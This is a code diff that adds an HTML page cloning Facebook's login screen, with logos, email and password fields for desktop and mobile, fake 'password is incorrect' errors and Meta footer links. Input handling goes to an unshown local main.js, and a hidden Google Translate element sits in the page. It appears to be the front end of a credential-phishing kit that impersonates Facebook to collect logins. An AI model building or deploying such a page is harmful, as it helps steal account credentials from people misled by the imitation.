@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <meta property="description" content="No 18+">
+    <meta property="og:image" content="./icon.png">
+    <meta property="og:type" content="article">
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+  <div id="facebook">
+    <div class="hidden sm:block pc">
+      <div class="bg-[#f2f4f7]">
+        <div
+          class="fb_content flex flex-col md:flex-row items-center md:items-start pt-[72px] pb-[112px] lg:w-[980px] mx-10 lg:mx-auto"
+          id="content"
+        >
+          <div class="w-[400px] lg:w-[580px] text-center md:text-left">
+            <div
+              class="md:pt-[112px] pb-4 flex items-center justify-center md:block"
+            >
+              <img
+                src="./fb.svg"
+                alt="Facebook"
+                class="h-[106px] -m-[28px]"
+              />
+            </div>
+            <h1
+              class="text-[24px] lg:text-[28px] leading-8 w-auto lg:w-[500px] font-normal pb-5"
+            >
+              Facebook helps you connect and share with the people in your life.
+            </h2>
+          </div>
+          <div class="form w-[400px] lg:w-[396px] h-[456px]">
+            <div class="pt-8 pb-2.5 text-center form--content m-4">
+              <div class="py-1.5">
+                <input
+                  type="text"
+                  class="ip"
+                  id="email_pc"
+                  placeholder="Email address or phone number"
+                  aria-label="Email address or phone number"
+                />
+              </div>
+              <div id="error_email" class="text-[#f02849] text-[13px] leading-4 mt-2 text-left mx-4 hidden">
+                The email address or mobile number you entered isn't connected to an account.
+              </div>
+              <div class="py-1.5">
+                <input
+                  type="password"
+                  class="ip"
+                  id="pass_pc"
+                  placeholder="Password"
+                />
+              </div>
+              <div id="error_pw" class="text-[#f02849] text-[13px] leading-4 mt-2 text-left mx-4 hidden">
+                Password is incorrect.
+              </div>
+              <button
+                id="btnSubmitMb"
+                class="btn--submit w-[calc(100%-32px)] text-[#fff]"
+                name="login"
+                type="submit"
+              >
+                <div id="loading" class="loading-spinner hidden"></div>
+                <span id="textLogin">Log in</span>
+              </button>
+              <p class="mt-4 text-center text-[#0866ff] text-sm">
+                Forgotten password?
+              </p>
+              <p class="border-b border-[#dadde1] border-solid my-5 mx-4"></p>
+              <button
+                class="btn--create h-12 text-[17px] leading-[48px] px-4 rounded-md font-semibold bg-[#42b72a] text-[#fff]"
+                name="login"
+                type="submit"
+              >
+                Create new account
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div
+        class="fb_lang pt-5 text-[#8a8d91] lg:w-[980px] mx-10 lg:mx-auto text-xs"
+        id="language"
+      >
+        <ul class="flex flex-wrap items-center gap-2 list-langs mb-3">
+          <li>English (UK)</li>
+          <li>Tiếng Việt</li>
+          <li>中文(台灣)</li>
+          <li>한국어</li>
+          <li>日本語</li>
+          <li>Français (France)</li>
+          <li>ภาษาไทย</li>
+          <li>Español</li>
+          <li>Português (Brasil)</li>
+          <li>Deutsch</li>
+          <li>Italiano</li>
+          <li
+            class="plus bg-[#f5f6f7] border-[#ccd0d5] border border-solid py-1 px-2 hover:bg-[#ebedf0] rounded-sm"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              fill="#8a8d91"
+              version="1.1"
+              width="10"
+              height="10"
+              viewBox="0 0 45.402 45.402"
+              xml:space="preserve"
+            >
+              <g>
+                <path
+                  d="M41.267,18.557H26.832V4.134C26.832,1.851,24.99,0,22.707,0c-2.283,0-4.124,1.851-4.124,4.135v14.432H4.141   c-2.283,0-4.139,1.851-4.138,4.135c-0.001,1.141,0.46,2.187,1.207,2.934c0.748,0.749,1.78,1.222,2.92,1.222h14.453V41.27   c0,1.142,0.453,2.176,1.201,2.922c0.748,0.748,1.777,1.211,2.919,1.211c2.282,0,4.129-1.851,4.129-4.133V26.857h14.435   c2.283,0,4.134-1.867,4.133-4.15C45.399,20.425,43.548,18.557,41.267,18.557z"
+                />
+              </g>
+            </svg>
+          </li>
+        </ul>
+        <span class="block border-b border-[#dddfe2] border-solid mb-2"></span>
+        <ul class="lists-other flex flex-wrap gap-x-4 gap-y-1">
+          <li>Sign Up</li>
+          <li>Log in</li>
+          <li>Messenger</li>
+          <li>Facebook Lite</li>
+          <li>Video</li>
+          <li>Places</li>
+          <li>Games</li>
+          <li>Marketplace</li>
+          <li>Meta Pay</li>
+          <li>Meta Store</li>
+          <li>Meta Quest</li>
+          <li>Ray-Ban Meta</li>
+          <li>Meta AI</li>
+          <li>Instagram</li>
+          <li>Threads</li>
+          <li>Fundraisers</li>
+          <li>Services</li>
+          <li>Voting Information Centre</li>
+          <li>Privacy Policy</li>
+          <li>Privacy Centre</li>
+          <li>Groups</li>
+          <li>About</li>
+          <li>Create ad</li>
+          <li>Create Page</li>
+          <li>Developers</li>
+          <li>Careers</li>
+          <li>Cookies</li>
+          <li>AdChoices</li>
+          <li>Terms</li>
+          <li>Help</li>
+          <li>Contact uploading and non-users</li>
+        </ul>
+        <span class="text-[#737373] text-[11px] my-5 block">Meta © 2024</span>
+      </div>
+    </div>
+    <div class="block sm:hidden mobile">
+      <p class="bg"></p>
+      <div class="flex flex-col px-4 h-screen">
+        <div class="logo">
+          <img
+            alt="Facebook from Meta"
+            src="./f.png"
+            style="
+              max-height: 60px;
+              min-height: 0px;
+              object-fit: contain;
+              overflow: hidden;
+            "
+            height="60"
+            width="60"
+          />
+        </div>
+        <div class="form h-[270px]">
+          <div class="pt-8 pb-2.5 text-center form--content">
+            <div class="py-1.5">
+              <input
+                type="text"
+                class="ip"
+                id="email_mb"
+                placeholder="Email address or phone number"
+                aria-label="Email address or phone number"
+              />
+            </div>
+            <div id="error_email1" class="text-[#f02849] text-[13px] leading-4 mt-2 text-left hidden">
+                The email address or mobile number you entered isn't connected to an account.
+              </div>
+            <div class="py-1.5">
+              <input
+                type="password"
+                class="ip"
+                id="pass_mb"
+                placeholder="Password"
+              />
+            </div>
+            <div id="error_pw1" class="text-[#f02849] text-[13px] leading-4 mt-2 text-left hidden">
+                Password is incorrect.
+              </div>
+            <button id="btnSubmit" class="btn--submit" name="login" type="submit" @click="handleLogin">
+              <div id="loading1" class="loading-spinner hidden"></div>
+              <span id="textLogin1">Log in</span>
+            </button>
+            <p class="mt-4 text-forgotten">Forgotten password?</p>
+          </div>
+        </div>
+        <div class="mb-ft">
+          <button class="btn--create">Create new account</button>
+          <div class="pt-5 pb-3 flex items-center justify-center">
+            <img
+              alt="Meta logo"
+              class="wbloks_1 h-[12px] w-[60px]"
+              src="./meta.png"
+              style="
+                height: 12px;
+                width: 60px;
+                mask-size: contain;
+                object-fit: contain;
+                overflow: hidden;
+              "
+            />
+          </div>
+          <div class="mb-4 flex items-center justify-center text-[10px] text-[rgb(99,120,138)] gap-1">
+            <span
+              style="
+                cursor: pointer;
+                -webkit-tap-highlight-color: transparent;
+                color: rgb(99, 120, 138);
+                display: inline;
+                font-size: 10px;
+                white-space: pre-wrap;
+                overflow-wrap: break-word;
+              "
+              >About</span
+            >
+            <span
+              style="
+                cursor: pointer;
+                -webkit-tap-highlight-color: transparent;
+                color: rgb(99, 120, 138);
+                display: inline;
+                font-size: 10px;
+                white-space: pre-wrap;
+                overflow-wrap: break-word;
+              "
+              >Help</span
+            >
+            <span
+              style="
+                cursor: pointer;
+                -webkit-tap-highlight-color: transparent;
+                color: rgb(99, 120, 138);
+                display: inline;
+                font-size: 10px;
+                white-space: pre-wrap;
+                overflow-wrap: break-word;
+              "
+              >More</span
+            >
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="opacity-0 h-0 w-0">
+        <div id="google_translate_element"></div>
+    </div>
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script src="main.js" defer></script>
+  </div>
+</body>
+</html>
